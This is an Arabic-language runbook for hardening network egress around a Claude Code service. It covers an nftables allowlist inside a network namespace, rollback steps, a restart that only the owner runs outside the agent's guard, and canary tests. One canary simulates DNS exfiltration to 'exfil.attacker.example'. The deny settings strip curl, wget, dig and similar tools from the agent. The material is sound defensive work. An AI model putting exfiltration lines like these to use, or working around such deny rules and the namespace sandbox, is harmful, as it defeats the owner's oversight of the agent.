# OWNER-STEPS — تطبيق egress hardening (تنفيذ المالك فقط)

> ⛔ لا تُنفَّذ أي خطوة هنا تلقائياً. كل خطوة root أو restart تحتاج إذن المالك الصريح
> **لتلك العملية بالذات**. الأوامر جاهزة للّصق في طرفية المالك.
> راجِع `netns-egress-allowlist.sh` و `README.md` و `managed-settings.deny.md` قبل البدء.

## ملخّص التسلسل

```
0. نسخة احتياطية + خطة rollback (موجودة أدناه)
1. تطبيق سكربت الـ netns ............... [root]
2. (اختياري) تطبيق قائمة الحجب المصحّحة . [root: تحرير managed-settings.json + إنشاء settings.json]
3. إعادة تشغيل nassaj-dev داخل الـ netns  [restart — يحجبه حارس العميل، ينفّذه المالك بطرفيته]
4. canary للـ egress .................... [تحقّق: وجهة غير مُدرَجة تفشل، api.anthropic.com تنجح]
```

---

## 0) نسخة احتياطية + rollback (قبل أي تغيير)

```bash
# نسخة من managed-settings (إن نويت تعديل الحجب في الخطوة 2):
sudo cp /home/nassaj/.claude/managed-settings.json \
        /home/nassaj/.claude/managed-settings.json.bak-egress-$(date +%Y%m%d-%H%M%S)

# لقطة حالة PM2 الحالية للرجوع:
pm2 save
cp /home/nassaj/.pm2/dump.pm2 /home/nassaj/.pm2/dump.pm2.bak-egress-$(date +%Y%m%d-%H%M%S)
```

**Rollback شامل** (يُعيد كل شيء كما كان):
```bash
# (a) أزِل الـ netns وقواعده:                                   # [root]
sudo /usr/sbin/ip netns del nassaj-egress 2>/dev/null || true
sudo /usr/sbin/ip link del veth-nsh 2>/dev/null || true
sudo /usr/sbin/nft delete table ip nassaj_egress_nat 2>/dev/null || true
# (b) استعد managed-settings إن عُدِّل:
sudo cp /home/nassaj/.claude/managed-settings.json.bak-egress-<TS> \
        /home/nassaj/.claude/managed-settings.json
# (c) أعِد تشغيل nassaj-dev بالوضع الطبيعي (خارج الـ netns) — المالك بطرفيته:
cd /home/nassaj/Project/nassaj-dev && env -u PORT pm2 restart ecosystem.config.cjs --update-env && pm2 save
```

---

## 1) تطبيق سكربت الـ netns  [root]

```bash
# راجِع السكربت سطراً سطراً أولاً، ثم:
sudo bash /home/nassaj/Project/nassaj-dev/docs/security/egress-hardening/netns-egress-allowlist.sh
```

تحقّق من النجاح (يطبع السكربت الـ ruleset؛ هذه تأكيدات إضافية):
```bash
sudo /usr/sbin/ip netns list | grep -w nassaj-egress           # يجب أن يظهر
sudo /usr/sbin/ip netns exec nassaj-egress /usr/sbin/nft list ruleset | grep -E 'policy drop|api'
```

---

## 2) (اختياري لكن موصى به) قائمة الحجب المصحّحة  [root]

اتبع `managed-settings.deny.md`:
- حرّر `permissions.deny` في `/home/nassaj/.claude/managed-settings.json` (أضف حُرّاس الـ egress،
  احفظ حُرّاس git push + prisma كما هي).
- احذف الـ allows الستة: `curl`/`wget`/`dig`/`nslookup`/`ping`/`host`.
- أنشئ `/home/nassaj/Project/nassaj-dev/.claude/settings.json` بنفس كتلة الـ deny.

> هذه الخطوة **defense-in-depth**؛ ليست شرطاً لعمل ضابط الـ egress (الـ netns كافٍ وحده).

---

## 3) إعادة تشغيل nassaj-dev داخل الـ netns  [restart — ينفّذه المالك]

> ⛔ **يحجبه حارس العميل** (`pm2 restart`/`pm2 delete`/`systemctl restart`). نفّذه في
> **طرفيتك الخاصة خارج Claude Code**. ويُفضَّل في لحظة **بلا جلسات claude نشطة** (راجع
> حادثة B-23: drain يمسك المنفذ 3004). الفكرة: PM2 يطلق العملية، لكن العملية يجب أن
> تُولَد **داخل** الـ netns كي ترث سياسة الـ egress، فتُلِفّ بـ `ip netns exec`.

### الطريقة الموصى بها: غلاف interpreter في ecosystem

PM2 يشغّل `dist-server/server/index.js`. ليولد داخل الـ netns، استبدل أمر التشغيل ليُلَفّ
بـ `ip netns exec`. أبسط تطبيق دون تعديل ملف الـ ecosystem دائم: شغّل عبر `pm2 start` بأمر
ملفوف (مؤقتاً)، أو أضِف في `ecosystem.config.cjs` حقلاً يجعل المفسّر هو الغلاف.

نهج جاهز للّصق (delete + start نظيف داخل الـ netns — **فقط بلا جلسات نشطة**):
```bash
# في طرفية المالك (خارج Claude Code):
pm2 delete nassaj-dev 2>/dev/null || true
cd /home/nassaj/Project/nassaj-dev
sudo /usr/sbin/ip netns exec nassaj-egress \
  sudo -u nassaj env -u PORT SERVER_PORT=3004 PORT=3004 NODE_ENV=production \
  pm2 start dist-server/server/index.js --name nassaj-dev -- --port 3004
pm2 save
```

> ملاحظتان:
> 1) داخل `ip netns exec` نعود لمستخدم `nassaj` بـ `sudo -u nassaj` كي لا تعمل العملية كـ root.
> 2) `delete + start` نظيف يجعل PM2 ينتظر `kill_timeout` للنسخة القديمة — لذا **بلا جلسات
>    نشطة** (B-24). إن وُجدت جلسات، انتظر انتهاء drain أولاً.

تحقّق أن العملية حيّة على المنفذ والـ netns الصحيح:
```bash
pm2 status nassaj-dev
ss -ltn | grep 127.0.0.1:3004                                  # يستمع
curl -fsS -o /dev/null -w '%{http_code}\n' http://127.0.0.1:3004   # 200 (curl من المالك، خارج الجلسة)
curl -fsS -o /dev/null -w '%{http_code}\n' https://nassaj.alkindy.tech   # 200 عبر النفق
```

---

## 4) Canary للـ egress (إثبات السياسة)

الهدف: **وجهة غير مُدرَجة في الـ allowlist يجب أن تفشل**، و **api.anthropic.com تنجح**.
نُجري الاختبار **داخل** الـ netns (نفس البيئة التي تعمل فيها عمليات الجلسة).

### (4.a) وجهة غير مُدرَجة — يجب أن تفشل (socket عبر node -e)

```bash
# يحاكي تماماً «دفع» تجاوز الحجب بالاسم: socket مباشر من node إلى وجهة غير مُدرَجة.
# يجب أن يطبع DROP-OK (فشل الاتصال = السياسة تعمل):
sudo /usr/sbin/ip netns exec nassaj-egress \
  node -e 'const s=require("net").connect(443,"example.com");
           s.setTimeout(5000);
           s.on("connect",()=>{console.log("LEAK-FAIL: connected to example.com");process.exit(1)});
           s.on("timeout",()=>{console.log("DROP-OK: timed out (blocked)");process.exit(0)});
           s.on("error",e=>{console.log("DROP-OK: "+e.code+" (blocked)");process.exit(0)});'
```
- النتيجة المقبولة: `DROP-OK …` (الاتصال حُجِب — `ETIMEDOUT`/`EHOSTUNREACH`/`ENETUNREACH`).
- إن طبع `LEAK-FAIL` → السياسة **لا تعمل**؛ نفّذ rollback (القسم 0) وراجِع القواعد.

### (4.b) وجهة غير مُدرَجة عبر DNS-tunnel — يجب أن تفشل

```bash
# استعلام DNS لوجهة غير tailnet عبر مُحلِّل غير MagicDNS يجب أن يُحجب:
sudo /usr/sbin/ip netns exec nassaj-egress \
  node -e 'const d=require("dns");d.setServers(["8.8.8.8"]);
           d.resolve4("exfil.attacker.example",e=>{console.log(e?("DROP-OK: "+e.code):"LEAK-FAIL: resolved via 8.8.8.8");process.exit(e?0:1)});'
```
- النتيجة المقبولة: `DROP-OK …` (لا وصول لمُحلِّل خارج 100.100.100.100).

### (4.c) api.anthropic.com — يجب أن تنجح (Body-1 مباشرة، بلا proxy)

```bash
sudo /usr/sbin/ip netns exec nassaj-egress \
  node -e 'const s=require("tls").connect(443,"api.anthropic.com",{servername:"api.anthropic.com"});
           s.setTimeout(8000);
           s.on("secureConnect",()=>{console.log("ALLOW-OK: TLS to api.anthropic.com");process.exit(0)});
           s.on("timeout",()=>{console.log("FAIL: api.anthropic.com timed out");process.exit(1)});
           s.on("error",e=>{console.log("FAIL: "+e.code);process.exit(1)});'
```
- النتيجة المقبولة: `ALLOW-OK …`.
- إن فشلت رغم وجود القاعدة → غالباً **دوران IP** للمزوّد (راجع تحذير العناوين في السكربت)؛
  أعِد تشغيل سكربت الـ netns لإعادة حلّ العناوين، أو انتقل لحل الـ proxy (القسم G في السكربت).

### (4.d) (اختياري) منفذ التطبيق المحلي — يجب أن ينجح

```bash
sudo /usr/sbin/ip netns exec nassaj-egress \
  node -e 'const s=require("net").connect(3004,"127.0.0.1");
           s.on("connect",()=>{console.log("ALLOW-OK: 127.0.0.1:3004");process.exit(0)});
           s.on("error",e=>{console.log("FAIL: "+e.code);process.exit(1)});'
```

---

## معيار القبول

| الفحص | المتوقَّع |
|:---|:---|
| 4.a socket إلى example.com | `DROP-OK` (محجوب) |
| 4.b DNS عبر 8.8.8.8 | `DROP-OK` (محجوب) |
| 4.c TLS إلى api.anthropic.com | `ALLOW-OK` (ينجح، بلا proxy) |
| 4.d 127.0.0.1:3004 | `ALLOW-OK` |
| `pm2 status nassaj-dev` | `online` |
| `curl https://nassaj.alkindy.tech` | 200 |

إن نجحت كلها: ضابط الـ egress فعّال والتطبيق سليم. إن فشل أي «يجب أن ينجح» أو نجح أي
«يجب أن يفشل»: نفّذ rollback (القسم 0) فوراً وراجِع القواعد قبل إعادة المحاولة.
